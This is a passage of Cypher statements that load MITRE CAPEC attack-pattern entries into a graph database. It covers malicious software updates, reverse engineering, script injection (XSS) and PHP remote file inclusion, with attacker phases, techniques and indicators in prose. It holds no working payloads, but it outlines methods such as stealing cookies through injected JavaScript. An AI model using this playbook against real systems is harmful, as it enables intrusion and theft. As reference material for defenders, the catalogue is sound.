Myspace pages make it easy to target users of a specific company or affiliation without relying on email address harvesting or spamming. One phishing-assisted variation on this attack involves hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update. This type of attack has also been conducted using an Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update. While both methods involve a high degree of automated mechanisms to support the attack, the primary vector for achieving the installation of the update remains a manual user-directed process, although clicking a link within an IM client or web application may initiate the update.\", \"Automated attacks involving malicious software updates require little to no user-directed activity and are therefore advantageous because they avoid the complex preliminary setup stages of manual attacks, which must effectively 'hook' users while avoiding countermeasures such as spam filters or web security filters.\"])])"});
MERGE (:CWE{id: 494});
CREATE (:ResourcesRequired{id: 85, text: "<div level=\"0\">\n  <p class=\"text\">Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code.</p>\n</div>"});
CREATE (:AttackPattern{id: 187, name: "Malicious Automated Software Update", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 165});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 135});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Architectural_Paradigms, Injection_Vector, Payload, Payload_Activation_Impact, References, Technical_Context"});
CREATE (:Description{id: 165, summary: "OrderedDict([('Text', [\"An attacker exploits a weakness in a server or client's process of delivering and verifying the integrity of code supplied by an update-providing server or mechanism to cause code of the attackers' choosing to be downloaded and installed as a software update. Attacks against automated update mechanisms involve attack vectors which are specific to the type of update mechanism, but typically involve two different attack strategies: redirection or spoofing. Redirection-based attacks exploit two layers of weaknesses in server or client software to undermine the integrity of the target code-base.\", 'The first weakness involves a failure to properly authenticate a server as a source of update or patch content. This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship. The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update.', \"One predominate type of redirection attack requires DNS spoofing or hijacking of a domain name corresponding to an update server. The target software initiates an update request and the DNS request resolves the domain name of the update server to the IP address of the attacker, at which point the software accepts updates either transmitted by or pulled from the attackers' server. Attacks against DNS mechanisms comprise an initial phase of a chain of attacks that facilitate automated update hijacking attack, and such attacks have a precedent in targeted activities that have been as complex as DNS/BIND attacks of corporate infrastructures, to untargeted attacks aimed at compromising home broadband routers, as well as attacks involving the compromise of wireless access points, as well as 'evil twin' attacks coupled with DNS redirection. Due to the plethora of options open to the attacker in forcing name resolution to arbitrary servers the Automated Update Hijacking attack strategies are the tip of the spear for many multi-stage attack chains.\", \"The second weakness that is exploited by the attacker is the lack of integrity checking by the software in validating the update. Software which relies only upon domain name resolution to establish the identity of update code is particularly vulnerable, because this signals an absence of other security countermeasures that could be applied to invalidate the attackers' payload on basis of code identity, hashing, signing, encryption, and other integrity checking mechanisms. Redirection-based attack patterns work equally well against client-side software as well as local servers or daemons that provide software update functionality. One precedent of redirection-based attacks involves the active exploitation of Firefox extensions, such as the Google Toolbar, Yahoo Toolbar, Facebook Toolbar, and others.\", \"The second strategy employed in Automated Hijacking Attacks are spoofing strategies, including content or identity spoofing, as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attackers' server. Such attacks have numerous precedents, one in particular being eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking.\"])])"});
MERGE (:Reference{local_id: "R.187.1", author: "ATT&CK Project", title: "Application Deployment Software (1017)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Application_deployment_software"});
MERGE (:CWE{id: 494});
CREATE (:ResourcesRequired{id: 86, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackPattern{id: 188, name: "Reverse Engineering", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 141, text: "<div level=\"0\">\n  <p class=\"text\">Access to targeted system, resources, and information.</p>\n</div>"});
CREATE (:Submission{id: 166});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 136});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"});
CREATE (:Modification{id: 137});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Examples-Instances, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 166, summary: "OrderedDict([('Text', 'An adversary discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or \"back engineer\" some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices, or software, although the methodology and techniques involved in each type of analysis differ widely.')])"});
MERGE (:Reference{id: "REF-6", local_id: "R.188.1", title: "Wikipedia", section: "Reverse engineering", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Reverse_engineering"});
CREATE (:ResourcesRequired{id: 87, text: "<div level=\"0\">\n  <p class=\"text\">The technical resources necessary to engage in reverse engineering differ in accordance with the type of object, resource, or system being analyzed.</p>\n</div>"});
CREATE (:AttackPattern{id: 189, name: "Black Box Reverse Engineering", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:Submission{id: 167});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 138});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required"});
CREATE (:PreviousEntryName{id: 34, name: "Software Reverse Engineering"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 167, summary: "OrderedDict([('Text', \"An attacker discovers the structure, function, and composition of a type of computer software through black box analysis techniques. 'Black Box' methods involve interacting with the software indirectly, in the absence of direct access to the executable object. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs.\")])"});
CREATE (:ResourcesRequired{id: 88, text: "<div level=\"0\">\n  <p class=\"text\">Black box methods require (at minimum) the ability to interact with the functional boundaries where the software communicates with a larger processing environment, such as inter-process communication on a host operating system, or via networking protocols.</p>\n</div>"});
CREATE (:AttackPattern{id: 19, name: "Embedding Scripts within Scripts", status: "Stable", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 142, text: "<div level=\"0\">\n  <p class=\"text\">Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts.</p>\n</div>"});
CREATE (:Submission{id: 168});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 139});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations"});
CREATE (:Description{id: 168, summary: "OrderedDict([('Text', \"An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. The adversary leverages this capability to execute his/her own script by embedding it within other scripts that the target software is likely to execute. The adversary must have the ability to inject script into script that is likely to be executed. If this is done, then the adversary can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts. With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an attacker can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host. These attacks are not solely limited to the server side, client side scripts like Ajax and client side JavaScript can contain malicious scripts as well.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Spider", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Inputs are used in a script element (script tag, DOM, etc.) and not in another type of element.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path or the URL fragment.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters (POST, GET, COOKIE, etc.) is created by the attacker. These parameters are possibly used in client-side scripts elements."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of application user interface entry fields is created by the attacker."});
CREATE (:Outcome{id: 3, type: "Success", description: "A list of resources accessed by the application is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Probe identified potential entry points for XSS vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results of the created requests.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">User-controllable input is output back to the browser</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">User-controllable input is embedded as part of script elements</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Output to the browser is not encoded to remove executable scripting syntax</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Server-side components execute script elements containing user-controllable input</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's script string is being reflected verbatim at some point in the web site (if not on the same page). Note that sometimes, the payload might be well encoded in the page, but wouldn't be encoded at all in some other section of the same web page (title, etc.)"});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker's script string is executed by the server-side component."});
CREATE (:Outcome{id: 3, type: "Failure", description: "All context-sensitive characters are consistently re-encoded before being sent to the web browser."});
CREATE (:Outcome{id: 4, type: "Inconclusive", description: "Some sensitive characters are consistently encoded, but others are not. Depending on which type of non-script element the payload is injected in, it may be possible to evade the encodings."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Steal session IDs, credentials, page content, etc.", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the user's cookies or other session identifiers."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker gets the content of the page the user is viewing."});
CREATE (:Outcome{id: 3, type: "Success", description: "The attacker causes the user's browser to visit a page with malicious content."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Forceful browsing", description: "<div level=\"0\">\n  <p class=\"text\">When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker indirectly controls the user's browser and makes it performing actions exploiting CSRF."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker manipulates the browser through the steps that he designed in his attack. The user, identified on a website, is now performing actions he is not aware of."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Content spoofing", description: "<div level=\"0\">\n  <p class=\"text\">By manipulating the content, the attacker targets the information that the user would like to get from the website.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The user sees a page containing wrong information"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
MERGE (:CWE{id: 284});
CREATE (:AttackPattern{id: 190, name: "Reverse Engineer an Executable to Expose Assumed Hidden Functionality or Content", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 169});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 140});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary, Other_Notes, Related_Attack_Patterns"});
CREATE (:Description{id: 169, summary: "OrderedDict([('Text', ['An attacker analyzes a binary file or executable for the purpose of discovering the structure, function, and possibly source-code of the file by using a variety of analysis techniques to effectively determine how the software functions and operates. This type of analysis is also referred to as Reverse Code Engineering, as techniques exist for extracting source code from an executable.', \"Several techniques are often employed for this purpose, both black box and white box. The use of computer bus analyzers and packet sniffers allows the binary to be studied at a level of interactions with its computing environment, such as a host OS, inter-process communication, and/or network communication. This type of analysis falls into the 'black box' category because it involves behavioral analysis of the software without reference to source code, object code, or protocol specifications.\"])])"});
MERGE (:Reference{id: "REF-6", local_id: "R.190.1", title: "Wikipedia", section: "Decompiler", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Decompiler"});
MERGE (:Reference{id: "REF-6", local_id: "R.190.2", title: "Wikipedia", section: "Debugger", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Debugger"});
MERGE (:Reference{id: "REF-6", local_id: "R.190.3", title: "Wikipedia", section: "Disassembler", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Disassembler"});
MERGE (:CWE{id: 798});
MERGE (:CWE{id: 259});
CREATE (:ResourcesRequired{id: 89, text: "<div level=\"0\">\n  <p class=\"text\">Access to the target file such that it can be analyzed with the appropriate tools. A range of tools suitable for analyzing an executable or its operations</p>\n</div>"});
CREATE (:AttackPattern{id: 191, name: "Read Sensitive Strings Within an Executable", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:Submission{id: 170});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 141});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary, Other_Notes, References, Related_Attack_Patterns, Resources_Required"});
CREATE (:Description{id: 170, summary: "OrderedDict([('Text', ['An attacker engages in activities to discover any sensitive strings are present within the compiled code of an executable, such as literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis.', \"One specific example of a sensitive string is a hard-coded password. Typical examples of software with hard-coded passwords include server-side executables which may check for a hard-coded password or key during a user's authentication with the server. Hard-coded passwords can also be present in client-side executables which utilize the password or key when connecting to either a remote component, such as a database server, licensing server, or otherwise, or a processes on the same host that expects a key or password.\", \"When analyzing an executable the attacker may search for the presence of such strings by analyzing the byte-code of the file itself. Example utilities for revealing strings within a file include 'strings,' 'grep,' or other variants of these programs depending upon the type of operating system used. These programs can be used to dump any ASCII or UNICODE strings contained within a program. Strings can also be searched for using a hex editors by loading the binary or object code file and utilizing native search functions such as regular expressions.\"])])"});
MERGE (:Reference{id: "REF-6", local_id: "R.191.1", title: "Wikipedia", section: "Decompiler", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Decompiler"});
MERGE (:Reference{id: "REF-6", local_id: "R.191.2", title: "Wikipedia", section: "Debugger", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Debugger"});
MERGE (:Reference{id: "REF-6", local_id: "R.191.3", title: "Wikipedia", section: "Disassembler", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Disassembler"});
MERGE (:Reference{local_id: "R.191.4", author: "ATT&CK Project", title: "Credentials in files (1081)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Credentials_in_files"});
MERGE (:CWE{id: 798});
MERGE (:CWE{id: 259});
CREATE (:ResourcesRequired{id: 90, text: "<div level=\"0\">\n  <p class=\"text\">Access to a binary or executable such that it can be analyzed by various utilities. Binary analysis programs such as 'strings' or 'grep', or hex editors.</p>\n</div>"});
CREATE (:AttackPattern{id: 192, name: "Protocol Analysis", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 143, text: "<div level=\"0\">\n  <p class=\"text\">Access to a binary executable.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 144, text: "<div level=\"0\">\n  <p class=\"text\">The ability to observe and interact with a communication channel between communicating processes.</p>\n</div>"});
CREATE (:Submission{id: 171});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 142});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Other_Notes, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses"});
CREATE (:Modification{id: 143});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:PreviousEntryName{id: 35, name: "Protocol Reverse Engineering"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 171, summary: "OrderedDict([('Text', \"An adversary engages in activities to decipher and/or decode protocol information for a network or application communication protocol used for transmitting information between interconnected nodes or systems on a packet-switched data network. While this type of analysis involves the analysis of a networking protocol inherently, it does not require the presence of an actual or physical network. Although certain techniques for protocol analysis benefit from manipulating live 'on-the-wire' interactions between communicating components, static or dynamic analysis techniques applied to executables as well as to device drivers, such as network interface drivers, can also be used to reveal the function and characteristics of a communication protocol implementation. Depending upon the methods used the process may involve observing, interacting, and modifying actual communications occurring between hosts. The goal of protocol analysis is to derive the data transmission syntax, as well as to extract the meaningful content, including packet or content delimiters used by the protocol. This type of analysis is often performed on closed-specification protocols, or proprietary protocols, but is also useful for analyzing publicly available specifications to determine how particular implementations deviate from published specifications.\")])"});
MERGE (:Reference{id: "REF-6", local_id: "R.192.1", title: "Wikipedia", section: "Proprietary protocol", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Proprietary_protocol"});
MERGE (:Reference{id: "REF-6", local_id: "R.192.2", title: "Wikipedia", section: "Reverse engineering", publisher: "The Wikimedia Foundation, Inc", link: "http://en.wikipedia.org/wiki/Reverse_engineering"});
CREATE (:ResourcesRequired{id: 91, text: "<div level=\"0\">\n  <p class=\"text\">Depending on the type of analysis, a variety of tools might be required, such as static code and/or dynamic analysis tools. Alternatively, the effort might require debugging programs such as ollydbg, SoftICE, or disassemblers like IDA Pro. In some instances, packet sniffing or packet analyzing programs such as TCP dump or Wireshark are necessary. Lastly, specific protocol analysis might require tools such as PDB (Protocol Debug), or packet injection tools like pcap or Nemesis.</p>\n</div>"});
CREATE (:AttackPattern{id: 193, name: "PHP Remote File Inclusion", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 145, text: "<div level=\"0\">\n  <p class=\"text\">Target application server must allow remote files to be included in the \"require\", \"include\", etc. PHP directives</p>\n</div>"});
CREATE (:Submission{id: 172});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 172, summary: "OrderedDict([('Text', 'In this pattern the attacker is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized \"include\" or \"require\" call, which the user can then control to point to any web-accessible file. This allows attackers to hijack the targeted application and force it to execute their own instructions.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey application", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">URL parameters are used by the application</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt variations on input parameters", description: "<div level=\"0\">\n  <p class=\"text\">The attack variants make use of a remotely available PHP script that generates a uniquely identifiable output when executed on the target application server. Possibly using an automated tool, an attacker requests variations on the inputs he surveyed before. He sends parameters that include variations of payloads which include a reference to the remote PHP script. He records all the responses from the server that include the output of the execution of remote PHP script.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a list of probe strings to inject in parameters of known URLs. The probe strings are variants of PHP remote file inclusion payloads which include a reference to the attackers' controlled remote PHP script.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results of manual input of remote file inclusion probes in known URLs.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The output of the remote PHP script is included in the response web page.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Nothing is returned to the web page. The payload script might have been executed in a different context which wouldn't be included in the response web page</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The application returns an error associated with the inclusion of remote file.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The application server doesn't download the remote PHP script.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's script is being executed on the application server and an output is being delivered at some point in the web site (if not on the same web page)"});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "The remote PHP script doesn't appear to have been executed by the application server. It is possible to create behaviors to monitor the execution such as, for example, the remote PHP script tries to make an HTTP request to an attacker controlled web server, and therefore if the remote PHP script is executed on the application server, the attacker would have evidence in the access log file of his web server."});
CREATE (:Outcome{id: 3, type: "Failure", description: "No access to the remote PHP script has been recorded to the access log file of the web server hosting this script"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
